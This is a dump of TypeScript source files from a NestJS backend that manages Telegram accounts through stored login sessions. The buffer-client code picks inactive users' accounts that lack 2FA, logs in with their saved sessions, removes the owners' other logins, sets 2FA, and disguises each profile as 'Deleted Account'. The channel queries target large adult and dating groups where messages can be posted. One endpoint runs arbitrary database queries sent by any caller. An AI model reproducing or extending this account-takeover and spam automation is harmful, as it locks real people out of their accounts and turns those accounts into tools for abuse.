               await sleep(2000)\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.bufferClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.deleteClient(document.mobile)\n                        await sleep(2000);\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile)\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...promoteclientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoBufferClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check buffer channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New buffer documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await this.telegramService.createClient(document.mobile, false);\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        await sleep(2000);\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const bufferClient = {\n                            tgId: document.tgId,\n                            session: document.session,\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(bufferClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created BufferClient=============\")\n                        await this.telegramService.deleteClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as BufferClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await this.telegramService.deleteClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForBufferClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreateBufferClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsString()\n  readonly session: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchBufferClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the bufferClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsOptional()\n  @IsString()\n  readonly session?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\n\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type BufferClientDocument = BufferClient & Document;\n@Schema({ collection: 'bufferClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class BufferClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  session: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { BuildService } from './build.service';\n\n@ApiTags('Build')\n@Controller('builds')\nexport class BuildController {\n  constructor(private readonly buildService: BuildService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get build data' })\n  async findOne(): Promise<any>{\n    return this.buildService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update build' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.buildService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BuildService } from './build.service';\nimport { BuildController } from './build.controller';\nimport { BuildSchema } from './builds.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    BuildModule,\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\n    NpointModule,\n  ],\n  providers: [BuildService],\n  controllers: [BuildController],\n  exports: [BuildModule],\n})\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Build } from './builds.schema';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class BuildService {\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\n        private npointSerive: NpointService) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.buildModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.buildModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        try {\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\n            console.log(\"Updated document successfully in npoint\")\n        } catch (error) {\n            console.log(error)\n        }\n        if (!updatedUser) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type BuildDocument = Build & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class Build {}\n\nexport const BuildSchema = SchemaFactory.createForClass(Build);\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","// src/channels/channels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ChannelsService } from './channels.service';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { SearchChannelDto } from './dto/search-channel.dto';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel } from './schemas/channel.schema';\n\n@ApiTags('Channels')\n@Controller('channels')\nexport class ChannelsController {\n  constructor(private readonly channelsService: ChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new  channel' })\n  async create(@Body() createChannelDto: CreateChannelDto) {\n    return this.channelsService.create(createChannelDto);\n  }\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\n    return this.channelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\n    console.log(query);\n    return this.channelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all  channels' })\n  async findAll() {\n    return this.channelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.channelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\n    return this.channelsService.update(channelId, updateChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.channelsService.remove(channelId);\n  }\n}\n","// src/channels/channels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ChannelsService } from './channels.service';\nimport { ChannelsController } from './channels.controller';\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\n  ],\n  controllers: [ChannelsController],\n  providers: [ChannelsService],\n  exports: [ChannelsService]\n})\nexport class ChannelsModule { }\n","// src/channels/channels.service.ts\nimport { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\n@Injectable()\nexport class ChannelsService {\n  constructor(\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\n  ) { console.log(Channel.name) }\n\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\n    const createdChannel = new this.ChannelModel(createChannelDto);\n    return createdChannel.save();\n  }\n\n  async createMultiple(createChannelDtos: CreateChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<Channel[]> {\n    return this.ChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<Channel> {\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<Channel[]> {\n    console.log(filter)\n    return this.ChannelModel.find(filter).exec();\n  }\n\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\n    const pattern = new RegExp(keywords.join('|'), 'i');\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\n    let query = {\n      $and: [\n        { username: { $ne: null } },\n        {\n          $or: [\n            { title: { $regex: pattern } },\n            { username: { $regex: pattern } }\n          ]\n        },\n        {\n          username: {\n            $not: {\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\n            }\n          }\n        },\n        {\n          title: { $not: { $regex: notPattern } }\n        },\n        {\n          username: { $not: { $regex: notPattern } }\n        },\n        {\n          sendMessages: false,\n          broadcast: false,\n          restricted: false\n        }\n      ]\n    };\n\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\n    try {\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.ChannelModel.find(query);\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 1000 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = notIds.length > 300 && false ? { randomField: 1 } : { participantsCount: -1 }\n    try {\n      const result: Channel[] = await this.ChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $addFields: { randomField: { $rand: {} } } }, // Add a random field\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateChannelDto {\n  @ApiProperty({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is a broadcast channel',\n    example: null,\n    required: false,\n  })\n  broadcast?: boolean;\n\n  @ApiProperty({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel is a megagroup',\n    example: null,\n    required: false,\n  })\n  megagroup?: boolean;\n\n  @ApiProperty({\n    description: 'Number of participants in the channel',\n    example: 0,\n  })\n  participantsCount: number;\n\n  @ApiProperty({\n    description: 'Whether the channel is restricted',\n    example: null,\n    required: false,\n  })\n  restricted?: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel can send messages',\n    example: null,\n    required: false,\n  })\n  sendMessages?: boolean;\n\n  @ApiProperty({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title: string;\n\n  @ApiProperty({\n    description: 'Username of the channel',\n    example: null,\n    required: false,\n  })\n  username?: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n\n  @ApiProperty({\n    default: false, example: false,\n    required: false,\n  })\n  forbidden: boolean = false;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class SearchChannelDto {\n  @ApiPropertyOptional({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title?: string;\n\n  @ApiPropertyOptional({\n    description: 'privacy of the channel',\n    example: false,\n  })\n  private?: string;\n\n  @ApiPropertyOptional({\n    description: 'Username of the channel',\n    example: 'ayesha_channel',\n  })\n  username?: string;\n\n  @ApiPropertyOptional({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs?: boolean;\n\n  @ApiPropertyOptional({\n    description: 'Minimum number of participants in the channel',\n    example: 10,\n  })\n  minParticipantsCount?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum number of participants in the channel',\n    example: 100,\n  })\n  maxParticipantsCount?: number;\n}\n","// src/channels/dto/update-channel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateChannelDto } from './create-channel.dto';\n\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\n\nexport type ChannelDocument = Channel & Document;\n@Schema({\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Channel {\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @Prop({ required: true })\n  title: string;\n\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @Prop({ required: true, default: false })\n  private: boolean;\n\n  @Prop({ default: false, required: false })\n  forbidden: boolean\n}\n\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiResponse } from '@nestjs/swagger';\r\nimport { ClientService } from './client.service';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { Client } from './schemas/client.schema';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\r\n\r\n@ApiTags('Clients')\r\n@Controller('clients')\r\nexport class ClientController {\r\n  constructor(private readonly clientService: ClientService) { }\r\n\r\n  /**\r\n   * Create a new client\r\n   */\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  @ApiResponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.create(createClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Search for clients based on query parameters\r\n   */\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  @ApiResponse({ status: 200, description: 'Matching user data returned successfully.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.search(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('updateClient/:clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async updateClient(@Param('clientId') clientId: string) {\r\n    this.clientService.updateClient(clientId);\r\n    return \"Update client initiated\";\r\n  }\r\n\r\n  /**\r\n   * Get all clients with masked sensitive fields\r\n   */\r\n  @Get('maskedCls')\r\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAllMasked(@Query() query: SearchClientDto) {\r\n    try {\r\n      return await this.clientService.findAllMasked(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get all clients\r\n   */\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAll(): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.findAll();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get a specific client by ID\r\n   */\r\n  @Get(':clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'User data returned successfully.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.findOne(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Update a specific client by ID\r\n   */\r\n  @Patch(':clientId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.update(clientId, updateClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Delete a specific client by ID\r\n   */\r\n  @Delete(':clientId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.remove(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  // @Get('setupClient/:clientId')\r\n  // @ApiOperation({ summary: 'SetUp Client data' })\r\n  // //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  // //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  // async setupClient(@Param('clientId') clientId: string, @Query() setupClientQueryDto: SetupClientQueryDto) {\r\n  //   this.clientService.setupClient(clientId, setupClientQueryDto);\r\n  //   return `Started Client Seup for ${clientId}`\r\n  // }\r\n\r\n  /**\r\n   * Execute a custom MongoDB query\r\n   */\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiResponse({ status: 200, description: 'Query executed successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid query.' })\r\n  @ApiBody({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.clientService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Add a mobile number to the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/add')\r\n  @ApiOperation({ summary: 'Add a mobile number to the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number added successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.addPromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Remove a mobile number from the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/remove')\r\n  @ApiOperation({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number removed successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.removePromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Client, ClientSchema } from './schemas/client.schema';\nimport { ClientService } from './client.service';\nimport { ClientController } from './client.controller';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { UsersModule } from '../users/users.module';\nimport { ArchivedClientModule } from '../archived-clients/archived-client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\n    forwardRef(()=>TelegramModule),\n    forwardRef(()=>BufferClientModule),\n    forwardRef(()=>UsersModule),\n    forwardRef(()=>ArchivedClientModule),\n    NpointModule\n  ],\n  controllers: [ClientController],\n  providers: [ClientService],\n  exports: [ClientService]\n})\nexport class ClientModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef, Query } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Client, ClientDocument } from './schemas/client.schema';\nimport { CreateClientDto } from './dto/create-client.dto';\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ArchivedClientService } from '../archived-clients/archived-client.service';\nimport { areJsonsNotSame, contains, fetchNumbersFromString, mapToJson, toBoolean } from '../../utils';\nimport { UpdateClientDto } from 